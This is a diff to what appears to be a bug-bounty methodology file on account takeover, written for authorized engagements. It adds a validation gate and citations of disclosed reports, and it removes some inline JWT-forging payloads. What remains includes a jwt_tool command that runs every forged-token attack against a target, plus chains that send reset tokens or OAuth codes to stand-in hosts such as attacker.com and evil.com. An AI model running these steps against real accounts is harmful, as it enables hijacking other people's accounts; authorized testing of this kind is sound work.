@@ -5,7 +5,22 @@ description: "Hunt account takeover — 9 paths plus chains. Paths: (1) password
 
 # HUNT-ATO — Account Takeover Taxonomy
 
+Authorized-engagement methodology. Every path below assumes the target is in scope (signed SOW / accepted bug-bounty program), that both accounts you touch are yours or issued to you (attacker A + test account B), and that any blind step (Host-header reset, `redirect_uri` theft) is confirmed out-of-band against infrastructure you control (Collaborator / a domain you own) — never against a real user's inbox or session.
+
 > 9 distinct paths. ATO is a destination class, not a single bug — each path below is a primitive that becomes Critical only when you demonstrate takeover of a SECOND account (test account B) you do not control, from attacker A's session/IP/device. A path that only locks you out of your own account, or only works when you already hold the victim's password AND session, is not a standalone ATO.
+
+## Validation & False-Positives (Gate 0)
+
+Run this gate BEFORE writing any ATO finding. Every path here produces a permissive-looking response that is *not* a takeover until B's identity is actually crossed.
+
+1. **Did you take over account B, or only affect account A?** The whole skill hinges on this. Perform the final privileged action (read B's data, log into B, change B's credential) from attacker A's browser/IP with zero access to B's mailbox or session. A flow that only resets *your own* password, or that needs B's live cookie you already stole via out-of-scope means, is not a standalone ATO.
+2. **Blind steps are OOB-confirmed, not response-inferred.** Path 1 (Host-header reset) and Path 9 (`redirect_uri` code theft) are proven only when the token/`code` actually lands on infrastructure you control — read the real email at your Collaborator host, or log the `?code=` server-side and exchange it. Do NOT infer success from a reflected `attacker.com` in the response body; many mailers pin the link domain server-side (Path 1 false-positive killer).
+3. **JWT — server accepted the forge, or you only decoded it?** Every JWT is readable; decoding proves nothing. The finding exists only when a tampered token (alg:none, key confusion, cracked HMAC) reaches a protected route and returns B's resource. `jwt_tool ... -t <url> -rh` gives the real HTTP verdict — trust that, not the local decode. If the server keys off the session cookie and ignores the forged `sub`, the JWT is not the trust boundary.
+4. **No-step-up state change is verified, not assumed.** Path 5/7 (email/password change with no re-auth) — many APIs treat `current_password` as optional in the schema but still 403 server-side, or accept the field and silently drop it. Replay without the field, then confirm the real state change (log in with the new password from a clean browser / read the changed email back).
+5. **OTP / recovery-answer brute is tractable, not just un-throttled.** A 6-digit reset code with no limiter is Critical; an 8-char alphanumeric backup code (`36^8`) is not brute-forcible — do the keyspace math (see `hunt-mfa-bypass`) before claiming impact. A rate-limit-only observation on `/forgot-password` with no token-guessing consequence is routinely rejected.
+6. **Common false positives to kill:** reflected-but-server-pinned reset host; a decoded (not server-accepted) forged JWT; a mass-assignment/email-change 200 with no enforced state flip; `AADSTS`/claims-challenge OAuth error bodies whose `access_token` substring is inside a claims field, not a usable token; self-lockout mistaken for ATO.
+
+---
 
 ### Path 1: Password Reset Poisoning (Host-Header)
 ```bash
@@ -58,22 +73,17 @@ Cookie: session=ATTACKER_A_SESSION
 ```
 If the change takes effect with no current-password challenge and no confirm-link to the OLD address, trigger password reset → reset lands at attacker mailbox → ATO. The strongest variant skips even the new-address confirmation. Branded pattern: account-link / email-change → ATO via missing re-auth.
 
-### Path 6: JWT Manipulation
+### Path 6: JWT Manipulation → ATO
+JWT is an ATO *primitive* here — forge `sub`/identity, present to a victim-B endpoint. The full attack matrix (alg:none family, RS256→HS256 key confusion with the JWK→PEM conversion mechanics, weak-HMAC crack `hashcat -m 16500`, `kid` path-traversal / SQLi, `jku`/`x5u`/embedded-`jwk` injection) is **owned by `hunt-api-misconfig` Class 1 — cross-link, do not restate**. Load it alongside this skill for the copy-paste depth; the ATO-specific discipline is below.
+
 ```bash
-# (a) alg:none — strip the signature, set header alg to none
-python3 -c "import jwt; print(jwt.encode({'sub':'victimB','role':'admin'}, key='', algorithm='none'))"
-# send: header {"alg":"none","typ":"JWT"}, payload {"sub":"victimB"}, empty signature
-#
-# (b) RS256 -> HS256 key confusion: re-sign with the server's PUBLIC key as the HMAC secret
-curl -s https://target.com/.well-known/jwks.json   # or /oauth/.well-known/...  grab the RSA pub key
-# convert JWK -> PEM, then sign HS256 using that PEM bytes as the secret -> server verifies it
-#
-# (c) weak HMAC secret: crack offline
-hashcat -a 0 -m 16500 token.jwt rockyou.txt   # -m 16500 = JWT
-#
-# (d) kid injection: kid=../../../dev/null (empty key) or kid=' UNION SELECT 'secret -- (SQL-backed kid)
+# Authoritative server-side verdict for the whole matrix, replayed against a victim-B-scoped route:
+jwt_tool <TOKEN> -M at \
+  -t "https://target.com/api/users/B" \
+  -rh "Authorization: Bearer <TOKEN>"
+#   -M at = run all Attacks + Tampering; -t/-rh replay each forged token LIVE (200-vs-401 per attack)
 ```
-**Verified grounding for this class:** [CVE-2015-9235](https://nvd.nist.gov/vuln/detail/CVE-2015-9235) (node `jsonwebtoken` <4.2.2 — alg confusion / none bypass), [CVE-2016-10555](https://nvd.nist.gov/vuln/detail/CVE-2016-10555) (`jwt-simple` RS256→HS256). **Validate:** forged token must reach a privileged endpoint as victim B (e.g. `GET /api/admin` or `/api/users/B`) — decoding/forging is not impact; an authorized action under B's identity is. If the server ignores the forged `sub` and keys off the session cookie, the JWT is not the trust boundary — no finding.
+`jwt_tool` (external arsenal — `pipx install jwt-tool`; see `external_arsenal.sh`) reports the real HTTP verdict, so you never claim a forge from a local decode. **ATO-specific validation:** the forged token must return victim B's data or perform an action under B's identity (`GET /api/users/B`, `GET /api/admin`) — decoding/forging is not impact. If the server ignores the forged `sub` and keys off the session cookie, the JWT is not the trust boundary — no finding. **Grounding for the ATO-via-JWT class:** [CVE-2015-9235](https://nvd.nist.gov/vuln/detail/CVE-2015-9235) (node `jsonwebtoken` <4.2.2 alg confusion / none bypass) and the 8x8/Jitsi-Meet key-confusion → moderator-room takeover ([H1 #1210502](https://hackerone.com/reports/1210502)); the disclosed-report detail lives in `hunt-api-misconfig` and `hunt-auth-bypass`.
 
 ### Path 7: Password Change Without Step-Up + Login Oracle
 ```bash
@@ -163,12 +173,26 @@ dig +short staging.target.com    # CNAME -> nonexistent-app.herokuapp.com  (NXDO
 
 ---
 
+## Disclosed-Report Citations — Real ATO Chains
+
+Real, verified coordinated-disclosure / bug-bounty cases, one per path family. Cite these — never invent a report ID or CVE. Each is an ATO *chain* (primitive → crossed-identity impact), matching the Gate above.
+
+- **Path 1 — Host-header reset poisoning → ATO (canonical class):** documented across public reset-poisoning writeups where `POST /forgot-password` with `X-Forwarded-Host: attacker.com` made the mailer build the reset link from the request Host, delivering the token to the attacker domain. Root cause: reset URL derived from an attacker-controllable header, not server config. Confirm OOB (Collaborator reads the real email), never from the reflected header. Also see `hunt-host-header`.
+- **Path 3/4 — Instagram account-recovery OTP brute (Laxman Muthiyah, 2019):** a 6-digit recovery code whose per-request-source rate limit collapsed under distributed origins → recover any account. Ties the "predictable/weak-token + weak limiter" paths to a real ATO; the keyspace-vs-limiter reasoning lives in `hunt-mfa-bypass`.
+- **Path 6 — 8x8 / Jitsi-Meet JWT alg-confusion → moderator takeover** ([H1 #1210502](https://hackerone.com/reports/1210502)): asymmetric verifier admitted an HS256 token signed with the published RS256 public key as the HMAC secret → attacker admitted as authenticated/moderator. **Path 6 — Argo CD JWT audience-confusion (CVE-2023-22482)** ([H1 #1889161](https://hackerone.com/reports/1889161)): a token minted for a different `aud` accepted because only the issuer signature was checked. Full JWT report set + payloads: `hunt-api-misconfig` Class 1 and `hunt-auth-bypass`.
+- **Path 3 (SAML variant) — Uber `uchat.uberinternal.com` SAML assertion forgery** ([H1 #223014](https://hackerone.com/reports/223014), $8,500): forged `NameID` accepted due to improper signature-scope validation → SSO session as any internal user. The SAML auth-wall detail lives in `hunt-auth-bypass`.
+- **Path 9 — nOAuth cross-IdP ATO via mutable `email` claim** ([Descope writeup](https://www.descope.com/blog/post/noauth)): attacker sets an Azure AD `mail` attribute to the victim's address, then "Log in with Microsoft" on any relying party keying users by the email claim → instant ATO. **Path 9 — Booking.com Facebook social-login ATO** ([Salt Labs](https://salt.security/blog/traveling-with-oauth-account-takeover-on-booking-com)): `redirect_uri`/callback abuse to steal the auth artifact. The OAuth-flow detail (redirect_uri validation, `state`, PKCE, code interception) is owned by `hunt-oauth` — cross-link, do not restate.
+- **Path 5 (mass-assignment feeder) — profile write sets a privileged/credential field:** the `PATCH /users/me` → `{"role":"admin"}` / `{"password":...}` binding class (OWASP API6:2023) is the create-side path into ATO; the full mass-assignment methodology and gadget→sink map live in `hunt-api-misconfig` Class 2. Verify the field flipped AND is enforced before claiming ATO.
+
+---
+
 ## Related Skills & Chains
 
 - **`hunt-idor`** — The most reliable ATO primitive that needs no email control and no race. Chain primitive: `PATCH /api/users/{victimB_uid}` with attacker-A session + victim UID + `{"email":"attacker@evil.com"}` → trigger password reset → reset email arrives at attacker → full ATO, zero victim interaction (Path 5 + IDOR = Critical).
 - **`hunt-mfa-bypass`** — Path 7 is only Critical if it also bypasses MFA. Chain primitive: password-change endpoint accepts a new password with no current-password challenge AND no MFA step-up → cookie theft (XSS / token leak) + login timing oracle → set new password from the stolen cookie → MFA-less ATO from any IP/device.
 - **`hunt-oauth`** — Path 9 lives here. Chain primitive: `redirect_uri` validation accepts subdomain match (`*.target.com`) + `hunt-subdomain` reveals a dangling CNAME on `staging.target.com` → claim it on Heroku/S3 → host an OAuth callback → victim clicks the crafted authorize URL → code lands on the attacker subdomain → exchange for token → ATO. Always JSON-parse OAuth error bodies; never substring-match `access_token`.
-- **`hunt-api-misconfig`** — Path 6 (JWT) detail lives here too: alg:none, RS256→HS256 key confusion (sign with the JWKS public key as the HMAC secret), `kid` path-traversal / SQLi, and weak-secret cracking (`hashcat -m 16500`). Load it together with this skill for the JWK→PEM conversion mechanics.
+- **`hunt-api-misconfig`** — Owns the deep JWT attack matrix (Class 1: alg:none, RS256→HS256 key confusion + JWK→PEM mechanics, `kid` path-traversal / SQLi, `jku`/`x5u`/embedded-`jwk`, weak-secret crack) AND mass-assignment. Path 6 is a cross-link, not duplicated — load hunt-api-misconfig for the copy-paste payloads and the `jwt_tool -M at` automation. Chain primitive: forge a JWT `sub`=victim B (or mass-assign `password`/`role` on a profile write) there → present to a victim-B endpoint here → demonstrate takeover per the ATO Gate.
+- **`hunt-auth-bypass`** — Owns the disclosed JWT auth-wall report set (8x8/Jitsi alg-confusion H1 #1210502, Argo CD audience-confusion CVE-2023-22482, signature-skip) and the Legacy-Protocol Matrix (XMLRPC/SharePoint native-cred endpoints that outlive SSO). Chain primitive: bypass auth to reach *any* authenticated session → pivot to Path 5/7 to convert an in-session foothold into persistent ATO of test account B. Cross-link, do not restate the report set.
 - **`hunt-host-header`** — Path 1 canonical primitive. Chain primitive: `POST /forgot-password` with `Host`/`X-Forwarded-Host: attacker.com` → mailer builds the link from the request Host → link points to `attacker.com/reset?token=XXXX` → victim clicks → token leaked → ATO. Confirm via Collaborator-hosted domain reading the real email, not the reflected header.
 - **`offensive-osint`** — Path 8 force-multiplier: most security-question answers (birth city, pet, first school, mother's maiden name) are OSINT-able from social profiles → recover account B with no brute force at all.
 - **`security-arsenal`** — Pull the Password-Reset Bypass Tables (`X-Forwarded-Host`, `X-Host`, `X-HTTP-Host-Override`, dual-Host smuggling), token-entropy payloads (sequential numeric, time-based predictable), the JWT attack table, and the always-rejected list for "rate-limit on /forgot-password" reports.
